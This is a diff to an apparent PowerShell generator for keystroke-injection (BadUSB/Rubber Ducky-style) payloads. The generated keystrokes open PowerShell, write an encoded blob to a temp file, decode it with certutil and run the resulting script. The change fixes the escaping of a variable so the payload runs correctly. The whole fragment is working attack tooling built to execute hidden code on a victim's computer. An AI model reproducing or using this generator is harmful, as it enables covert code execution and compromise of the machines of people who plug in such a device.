@@ -76,7 +76,7 @@ else
 "DELAY 200" | Out-File -FilePath "$payload_file" -Append
 "STRING powershell" | Out-File -FilePath "$payload_file" -Append
 "DELAY 200" | Out-File -FilePath "$payload_file" -Append
-"STRING `$TempFile = `"`$env:TEMP\temp.ps1`"; `$File = `"`$env:TEMP\l.ps1`"; echo $output`> `"`$TempFile`"; certutil -f -decode `"`$TempFile`" `"$File`" `| out-null`; `& `"`$env:TEMP\l.ps1`"" | Out-File -FilePath "$payload_file" -Append
+"STRING `$TempFile = `"`$env:TEMP\temp.ps1`"; `$File = `"`$env:TEMP\l.ps1`"; echo $output`> `"`$TempFile`"; certutil -f -decode `"`$TempFile`" `"`$File`" `| out-null`; `& `"`$env:TEMP\l.ps1`"" | Out-File -FilePath "$payload_file" -Append
 "DELAY 1000" | Out-File -FilePath "$payload_file" -Append
 "ENTER" | Out-File -FilePath "$payload_file" -Append
 Write-Host "`nPayload Generation Complete.`n`n  Location: $payload_file`n`n"
